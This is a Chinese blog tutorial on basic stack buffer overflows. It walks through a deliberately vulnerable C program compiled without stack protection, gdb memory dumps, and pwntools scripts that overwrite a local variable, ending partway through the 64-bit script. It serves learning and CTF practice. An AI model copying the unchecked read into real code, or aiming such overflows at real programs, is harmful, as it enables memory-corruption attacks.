<!doctype html><html lang=zh><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>入门pwn</title><meta content=入门pwn name=title><meta content=一点点从这个世界上消失。 name=description><meta content=website property=og:type><meta content=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/ property=og:url><meta content="weakptr's blog" property=og:site_name><meta content=入门pwn property=og:title><meta content=一点点从这个世界上消失。 property=og:description><meta content=https://nnnewb.github.io/image/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/ property=twitter:url><meta content=入门pwn property=twitter:title><meta content=一点点从这个世界上消失。 property=twitter:description><meta content=https://nnnewb.github.io/image/favicon.ico property=twitter:image><link href=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/ rel=canonical><link rel="shortcut icon" href=https://nnnewb.github.io/image/favicon.ico type=image/x-icon><link href=https://nnnewb.github.io/css/reset.css rel=stylesheet><link href=https://nnnewb.github.io/css/pallete.css rel=stylesheet><link href=https://nnnewb.github.io/css/suCSS.css rel=stylesheet><link href=https://nnnewb.github.io/archive.css rel=stylesheet><link href=https://nnnewb.github.io/style.css rel=stylesheet><script defer src=https://nnnewb.github.io/js/script.js></script><link crossorigin href=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css integrity=sha384-9eLZqc9ds8eNjO3TmqPeYcDj8n+Qfa4nuSiGYa6DjLNcv9BtN69ZIulL9+8CqC9Y rel=stylesheet><script crossorigin defer integrity=sha384-K3vbOmF2BtaVai+Qk37uypf7VrgBubhQreNQe9aGsz9lB63dIFiQVlJbr92dw2Lx src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.js></script><script crossorigin defer integrity=sha384-zWYbd0NBwgTsgIdFKVprSfTh1mbMPe5Hz1X3yY4Sd1h/K1cQoUe36OGwAGz/PcDy src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/mathtex-script-type.min.js></script><script crossorigin defer integrity=sha384-kmZOZB5ObwgQnS/DuDg6TScgOiWWBiVt0plIRkZCmE6rDZGrEOQeHM5PcHi+nyqe src=https://cdn.jsdelivr.net/npm/katex@0.10.0/dist/contrib/auto-render.min.js></script><script>document.addEventListener("DOMContentLoaded", function () {
        renderMathInElement(document.body, {
            // customised options
            // • auto-render specific keys, e.g.:
            delimiters: [
                { left: '$$', right: '$$', display: true },
                { left: '$', right: '$', display: false },
                { left: '\\(', right: '\\)', display: false },
                { left: '\\[', right: '\\]', display: false }
            ],
            // • rendering keys, e.g.:
            throwOnError: true
        });
    });</script><script src=https://cdn.jsdelivr.net/npm/mermaid@11.6.0/dist/mermaid.min.js></script><script>document.addEventListener('DOMContentLoaded', function () {
        // 查找所有具有 'pre' 标签且类名为 'language-mermaid' 的元素
        const mermaidElements = document.getElementsByClassName('language-mermaid');
        for (let i = 0; i < mermaidElements.length; i++) {
            const el = mermaidElements.item(i);
            if (el.tagName === "PRE" && !el.classList.contains('mermaid')) {
                el.innerHTML = el.textContent;
                el.classList.add('mermaid');
            }
        }

        mermaid.initialize({ startOnLoad: true, theme: 'dark', });
    })</script><script>if (window.location.hostname.toLowerCase() !== 'localhost' && window.location.hostname !== '127.0.0.1') {
        var _hmt = _hmt || [];
        (function () {
            var hm = document.createElement("script");
            hm.src = "https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad";
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(hm, s);
        })();
    }</script><link href=https://chinese-fonts-cdn.deno.dev/packages/lxgwwenkaibright/dist/LXGWBright-Medium/result.css rel=stylesheet><link href=https://chinese-fonts-cdn.deno.dev/packages/maple-mono-cn/dist/MapleMono-CN-Regular/result.css rel=stylesheet><body><header><nav id=nav-bar><a href=/> 首页 </a>  /  <a href=/posts/> 文章 </a>  /  <a href=/categories/> 分类 </a>  /  <a href=/tags/> 标签 </a>  /  <a href=/search/> 搜索 </a>  /  <div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://nnnewb.github.io/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://nnnewb.github.io/click.ogg type=audio/ogg></audio></div></nav></header><main><h1>入门pwn</h1><p class=author-line>作于：2022-08-18 17:52 ，预计阅读时间 11 分钟<article><h2 id=qian-yan>前言</h2><p>经过很长一段时间的学习（理解为浪费时间即可），终于能简单过个 pwn 的 demo 了。于是水一篇博客记录一下。<h2 id=zhun-bei>准备</h2><p>建立一个 pwn 文件夹做工作区，初始化一个 python 环境，装好 <code>pwntools</code> ，虽然还不怎么用得到。题目来源是 <a href=https://ctf101.org/binary-exploitation/buffer-overflow/>ctf101 binary-exploitation buffer-overflow</a>，源码略做修改。<pre class=language-c data-lang=c style=color:#fdf4c1aa;background-color:#282828><code class=language-c data-lang=c><span style=color:#fa5c4b>#include </span><span style=color:#b8bb26>&lt;stdio.h>
</span><span style=color:#fa5c4b>#include </span><span style=color:#b8bb26>&lt;unistd.h>
</span><span>
</span><span style=color:#fa5c4b>int </span><span style=color:#8ec07c>main</span><span>(</span><span style=color:#fa5c4b>void</span><span>) {
</span><span>  </span><span style=color:#fa5c4b>volatile int</span><span> secret </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0x12345678</span><span>;
</span><span>  </span><span style=color:#fa5c4b>char</span><span> buffer[</span><span style=color:#d3869b>100</span><span>] </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>""</span><span>;
</span><span>  </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"buffer: </span><span style=color:#fdf4c1>%p</span><span style=color:#b8bb26>, secret: </span><span style=color:#fdf4c1>%p</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>, buffer, </span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>secret)</span><span>;
</span><span>  </span><span style=color:#fdf4c1>read(STDIN_FILENO, buffer, </span><span style=color:#d3869b>0x100</span><span style=color:#fdf4c1>)</span><span>; </span><span style=color:#928374;font-style:italic>// ! dangerous !
</span><span>  </span><span style=color:#fa5c4b>if </span><span>(secret </span><span style=color:#fe8019>== </span><span style=color:#d3869b>0x1234</span><span>) {
</span><span>    </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"cool!"</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  } </span><span style=color:#fa5c4b>else </span><span>{
</span><span>    </span><span style=color:#fabd2f>puts</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"that's not cool enough."</span><span style=color:#fdf4c1>)</span><span>;
</span><span>  }
</span><span>  </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
</span><span>}
</span></code></pre><p>漏洞行已经标注出。题意比较清楚，通过 <code>read(0,buffer,0x100)</code> 溢出覆写 <code>secret</code>，来通过后续的检查。<code>volatile</code>是为了避免被优化成寄存器变量，不过指定 <code>-O0</code> 的时候加不加<code>volatile</code>都无所谓。<p>简单写个 <code>Makefile</code> 编译出 32 和 64 位两个版本，之后也会写两个 exp 。<pre class=language-makefile data-lang=makefile style=color:#fdf4c1aa;background-color:#282828><code class=language-makefile data-lang=makefile><span style=color:#8ec07c>all</span><span style=color:#fe8019>: </span><span style=color:#b8bb26>question32 question64
</span><span>
</span><span style=color:#8ec07c>question32</span><span style=color:#fe8019>: </span><span style=color:#b8bb26>question.c
</span><span>	</span><span style=color:#fdf4c1>gcc $^ -m32 -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question32
</span><span>
</span><span style=color:#8ec07c>question64</span><span style=color:#fe8019>: </span><span style=color:#b8bb26>question.c
</span><span>	</span><span style=color:#fdf4c1>gcc $^ -Wall -Wextra -Wpedantic -fno-stack-protector -g -O0 -o question64
</span><span>
</span></code></pre><p>比较重要的是 <code>-fno-stack-protector</code>，不加的话会在溢出 <code>buffer</code> 的时候触发 stack canary 检测，直接报 <code>stack smashing detected</code> 后退出。不过 32 位似乎没这个问题。<p>再创建 <code>exploit32.py</code>和<code>exploit64.py</code>两个文件用来保存我们的exploit脚本，准备工作就算结束了。<h2 id=huan-chong-qu-yi-chu>缓冲区溢出</h2><h3 id=yuan-li>原理</h3><p>引用自 <a href=https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/stack-based-buffer-overflow>ired.team binary exploitation</a> ：<blockquote><p>At a high level, exploiting a buffer overflow boils down to the following key points:<ul><li>Attacker overflows vulnerable program's memory buffer by writing to it more data (including the malicious code, usually shellcode) than the program anticipated, but did nothing (bound checking) to prevent it from happening;<li>When a memory buffer is overflowed, the adjacent memory in the vulnerable program is replaced with malicious content supplied by an attacker;<li>Attacker subverts the vulnerable program and forces it to execute the malicious code, which was written to the compromised program's memory, when the program's memory buffer was overflowed;<li>The vulnerable program starts executing malicious code, and depending on what the vulnerable program is/what security context it runs in and whether it is being exploited locally or over the network, results in attacker escalating their privileges on an already compromised system or provides them with a remote access to system being exploited.</ul></blockquote><p>简而言之，就是通过覆写内存，操纵程序的控制流，运行攻击者的恶意代码或窃取数据。<h3 id=32wei-zhan-shang-huan-chong-qu-yi-chu>32位栈上缓冲区溢出</h3><p>分析案例代码，<code>buffer</code>和<code>secret</code>是栈上相邻的变量，从声明顺序盲猜<code>secret</code>在更接近栈底的位置（高地址），<code>buffer</code>在更接近栈顶的位置（低地址）。x86体系结构下栈从高地址向低地址增长，<code>&buffer[0]</code>是栈顶，则<code>&buffer[100]</code>就是<code>secret</code>的地址了。<p><img alt=image-20220815163807747 src=https://nnnewb.github.io/posts/2022/2022-08-18-ru-men-pwn/image-20220815163807747.png.webp><p><code>read(STDIN_FILENO, buffer, 0x100)</code> 从标准输入读取 <code>0x100</code> 个字节，从 <code>&buffer[0]</code> 开始写入。因为边界检查失效（写入长度<code>0x100</code>大于<code>buffer[100]</code>长度），只要我们提供 <code>104</code> 个字节的输入，最后四个字节就会覆盖 <code>secret</code> 变量的值。<p>为了验证上面的说法，可以先创建一个 payload 文件作为 <code>question32</code> 的输入。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fabd2f>open</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>'payload32.bin'</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>'wb+'</span><span style=color:#fdf4c1>).write(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x41'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>104</span><span style=color:#fdf4c1>)
</span></code></pre><p>接下来使用 gdb 观察读取输入前后的栈数据。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>Reading symbols from question32...
</span><span>(gdb) b question.c:8
</span><span>Breakpoint 1 at 0x1214: file question.c, line 8.
</span><span>(gdb) b question.c:9
</span><span>Breakpoint 2 at 0x122a: file question.c, line 9.
</span><span>(gdb) r &lt; payload32.bin
</span><span>Starting program: /home/weakptr/repos/pwn/lab-1/question32 &lt; payload32.bin
</span><span>[Thread debugging using libthread_db enabled]
</span><span>Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
</span><span>buffer: 0xffffd058, secret: 0xffffd0bc
</span><span>
</span><span>Breakpoint 1, main () at question.c:8
</span><span>8         read(STDIN_FILENO, buffer, 0x100);
</span><span>(gdb) x/32x $esp
</span><span>0xffffd050:     0x00000000      0x00000000      0x00000000      0x00000000
</span><span>0xffffd060:     0x00000000      0x00000000      0x00000000      0x00000000
</span><span>0xffffd070:     0x00000000      0x00000000      0x00000000      0x00000000
</span><span>0xffffd080:     0x00000000      0x00000000      0x00000000      0x00000000
</span><span>0xffffd090:     0x00000000      0x00000000      0x00000000      0x00000000
</span><span>0xffffd0a0:     0x00000000      0x00000000      0x00000000      0x00000000
</span><span>0xffffd0b0:     0x00000000      0x00000000      0x00000000      *0x12345678*
</span><span>0xffffd0c0:     0xffffd100      0xf7fbe66c      0xf7fbeb20      0xffffd0f0
</span><span>(gdb)
</span></code></pre><p>观察第 21 行，<code>0xffffd0bc</code> 处，<code>0x12345678</code>，就是 <code>question.c</code> 中初始化的 <code>secret</code> 了。而从 <code>0xffffd0508</code>到<code>0xffffd0bc</code>就是<code>buffer</code>的内容。<p>我们继续执行到 <code>read</code> 这一行后。<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(gdb) next
</span><span>
</span><span>Breakpoint 2, main () at question.c:9
</span><span>9         if (secret == 0x1234) {
</span><span>(gdb) x/32x $esp
</span><span>0xffffd050:     0x00000000      0x00000000      0x41414141      0x41414141
</span><span>0xffffd060:     0x41414141      0x41414141      0x41414141      0x41414141
</span><span>0xffffd070:     0x41414141      0x41414141      0x41414141      0x41414141
</span><span>0xffffd080:     0x41414141      0x41414141      0x41414141      0x41414141
</span><span>0xffffd090:     0x41414141      0x41414141      0x41414141      0x41414141
</span><span>0xffffd0a0:     0x41414141      0x41414141      0x41414141      0x41414141
</span><span>0xffffd0b0:     0x41414141      0x41414141      0x41414141      *0x41414141*
</span><span>0xffffd0c0:     0xffffd100      0xf7fbe66c      0xf7fbeb20      0xffffd0f0
</span><span>(gdb) p /x secret
</span><span>$2 = 0x41414141
</span></code></pre><p>观察到 <code>secret</code> 被覆盖为 <code>0x41414141</code>。<p>现在只需要把 payload32.bin 中最后四个字节改成预期的 <code>secret</code> 值 <code>0x1234</code> 即可。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>proc </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.process(</span><span style=color:#b8bb26>'./question32'</span><span style=color:#fdf4c1>)
</span><span>b </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'@l'</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x1234</span><span style=color:#fdf4c1>)
</span><span style=color:#fdf4c1>proc.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x41'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>100 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>b)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(proc.recv().decode())
</span><span>
</span></code></pre><p>结果：<pre style=color:#fdf4c1aa;background-color:#282828><code><span>(.venv) vm :: repos/pwn/lab-1 » python exploit32.py
</span><span>[+] Starting local process './question32': pid 640653
</span><span>[*] Process './question32' stopped with exit code 0 (pid 640653)
</span><span>buffer: 0xffc0bf88, secret: 0xffc0bfec
</span><span>cool!
</span><span>
</span></code></pre><h3 id=64wei-zhan-shang-huan-chong-qu-yi-chu>64位栈上缓冲区溢出</h3><p>x86-64架构下的栈上缓冲区溢出和 32 位架构有所不同，主要区别在于 64位 ELF 多了很多保护机制，直接影响栈上缓冲区溢出的就有 stack canary。<h4 id=stack-canary>stack canary</h4><p>关于 stack canary 机制的解释摘录如下。<blockquote><p>Stack Canaries are a secret value placed on the stack which changes every time the program is started. Prior to a function return, the stack canary is checked and if it appears to be modified, the program exits immeadiately.</blockquote><p>尝试让 gcc 吐出带 canary 的汇编如下，命令 <code>gcc -S question.c -g -O0 -fstack-protector -o question64.s</code><pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>main:
</span><span style=color:#8ec07c>	endbr64
</span><span style=color:#8ec07c>	pushq	%</span><span style=color:#fdf4c1>rbp
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rsp, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rbp
</span><span style=color:#8ec07c>	addq	$</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>128</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rsp
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>fs</span><span style=color:#8ec07c>:</span><span style=color:#d3869b>40</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rax
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rax, -</span><span style=color:#d3869b>8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	xorl	%</span><span style=color:#fdf4c1>eax, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c>	movl	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>305419896</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>116</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>112</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>104</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>96</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>88</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	// 略
</span><span style=color:#8ec07c>    movl	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rdx
</span><span style=color:#8ec07c>	subq	%</span><span style=color:#fdf4c1>fs</span><span style=color:#8ec07c>:</span><span style=color:#d3869b>40</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rdx
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>je	</span><span style=color:#8ec07c>.L5
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>call	</span><span style=color:#8ec07c>__stack_chk_fail@PLT
</span><span style=color:#8ec07c>.L5:
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>leave
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>ret
</span></code></pre><p>在函数序言部分多出了几条指令：<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>fs</span><span style=color:#8ec07c>:</span><span style=color:#d3869b>40</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rax
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rax, -</span><span style=color:#d3869b>8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	xorl	%</span><span style=color:#fdf4c1>eax, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span></code></pre><p>而末尾返回之前多了一条判断：<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>    movl	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>eax
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>8</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rdx
</span><span style=color:#8ec07c>	subq	%</span><span style=color:#fdf4c1>fs</span><span style=color:#8ec07c>:</span><span style=color:#d3869b>40</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rdx
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>je	</span><span style=color:#8ec07c>.L5
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>call	</span><span style=color:#8ec07c>__stack_chk_fail@PLT
</span><span style=color:#8ec07c>.L5:
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>leave
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>ret
</span></code></pre><p>明显能看出，<code>%fs:40</code> 就是上文引用中所谓的 <em>a secret value placed on the stack which changes every time the program is started</em> 。<h4 id=zhan-dui-qi>栈对齐</h4><p>在64位系统上，栈默认会对齐到 16 字节（也许看编译器默认参数，在我的实验环境中是这样的）。例如案例中 <code>question.c</code> 的 <code>secret</code> 我们可以看做 4 字节大小（<em>具体大小和你的系统、CPU、编译器都有关系</em>），也就是 <code>buffer</code> 加上 <code>secret</code> 一共 104 个字节，除 16 得 6.5 显然是没对齐的。编译器会自动分配对齐到 16 字节的栈大小：112 。<pre class=language-asm data-lang=asm style=color:#fdf4c1aa;background-color:#282828><code class=language-asm data-lang=asm><span style=color:#8ec07c>main:
</span><span style=color:#8ec07c>	pushq	%</span><span style=color:#fdf4c1>rbp
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rsp, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rbp
</span><span style=color:#8ec07c>	subq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>112</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rsp </span><span style=color:#8ec07c># </span><span style=color:#fabd2f>align </span><span style=color:#8ec07c>to </span><span style=color:#d3869b>16 </span><span style=color:#8ec07c>bytes
</span><span style=color:#8ec07c>	movl	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>305419896</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>112</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>104</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>96</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>88</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>80</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>72</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>64</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>56</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>48</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>40</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>32</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	</span><span style=color:#fa5c4b>movq	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>24</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	movl	</span><span style=color:#fabd2f>$</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>, -</span><span style=color:#d3869b>16</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)
</span><span style=color:#8ec07c>	leaq	</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>4</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rdx </span><span style=color:#8ec07c># %</span><span style=color:#fdf4c1>rdx </span><span style=color:#8ec07c>=> secret
</span><span style=color:#8ec07c>	leaq	</span><span style=color:#fdf4c1>-</span><span style=color:#d3869b>112</span><span style=color:#8ec07c>(%</span><span style=color:#fdf4c1>rbp</span><span style=color:#8ec07c>)</span><span style=color:#fdf4c1>, </span><span style=color:#8ec07c>%</span><span style=color:#fdf4c1>rax </span><span style=color:#8ec07c># %</span><span style=color:#fdf4c1>rax </span><span style=color:#8ec07c>=> buffer
</span></code></pre><p>简单计算可得 <code>-4(%rbp) ~ (%rbp)</code> 是 <code>secret</code>，<code>-12(%rbp) ~ -4(%rbp)</code> 是为了对齐而填充的大小。<p>如果我们想溢出覆盖 <code>secret</code> 的值，则需要填充 100 字节的 <code>buffer</code> + 8 字节的对齐 + 4 字节 <code>secret</code> 值，一共 112 字节的 payload。<pre class=language-python data-lang=python style=color:#fdf4c1aa;background-color:#282828><code class=language-python data-lang=python><span style=color:#fa5c4b>import </span><span>pwn
</span><span style=color:#fa5c4b>import </span><span>struct
</span><span>
</span><span>proc </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>pwn.process(</span><span style=color:#b8bb26>'./question64'</span><span style=color:#fdf4c1>)
</span><span>b </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>struct.pack(</span><span style=color:#b8bb26>'@q'</span><span style=color:#fdf4c1>, </span><span style=color:#d3869b>0x1234</span><span style=color:#fdf4c1>)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(b)
</span><span style=color:#fdf4c1>proc.sendline(</span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x41'</span><span style=color:#fe8019>*</span><span style=color:#d3869b>100 </span><span style=color:#fe8019>+ </span><span style=color:#fa5c4b>b</span><span style=color:#b8bb26>'\x00' </span><span style=color:#fe8019>* </span><span style=color:#d3869b>8 </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>b)
</span><span style=color:#fabd2f>print</span><span style=color:#fdf4c1>(proc.recv().decode())
</span><span>
